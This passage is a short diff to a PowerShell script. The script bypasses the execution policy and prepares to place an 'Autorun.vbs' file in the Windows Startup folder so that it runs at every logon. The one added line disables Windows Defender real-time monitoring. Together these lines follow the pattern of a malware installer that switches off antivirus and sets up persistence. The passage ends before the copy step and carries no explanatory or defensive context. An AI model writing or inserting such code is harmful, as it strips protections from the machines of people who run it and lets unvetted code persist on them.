@@ -1,4 +1,5 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
+Set-MpPreference -DisableRealtimeMonitoring $true
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $startupPath = [Environment]::GetFolderPath("Startup")
 $destination = Join-Path $startupPath "Autorun.vbs.lnk"
